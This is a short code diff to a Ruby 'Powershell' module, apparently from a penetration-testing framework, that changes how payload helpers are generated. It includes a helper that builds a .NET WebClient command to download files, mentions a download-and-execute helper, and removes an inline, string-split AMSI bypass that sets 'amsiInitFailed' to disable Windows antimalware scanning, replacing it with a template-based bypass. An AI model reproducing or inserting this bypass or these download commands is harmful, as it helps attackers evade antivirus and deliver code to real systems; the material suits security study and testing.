@@ -18,7 +18,6 @@ module Powershell
       target ||= '$pwd\\' << src.split('/').last
       %Q^(new-object System.Net.WebClient).DownloadFile('#{src}', '#{target}')^
     end
-
     #
     # Download file via .NET WebClient and execute it afterwards
     #
@@ -86,14 +85,15 @@ module Powershell
     end
 
     #
-    # Return mattifestation's AMSI bypass
+    # Return an AMSI bypass
     #
     # @return [String] PowerShell code to bypass AMSI
     def self.bypass_amsi()
-      %q{
-        $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
-        $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
-      }
+      template_pathname = File.join(Rex::Powershell::Templates::TEMPLATE_DIR, 'amsi_bypass_1.ps1.template')
+      script = Rex::Powershell::Script.new(File.read(template_pathname))
+      script.strip_comments
+      script.strip_whitespace
+      script.code
     end
 
     #
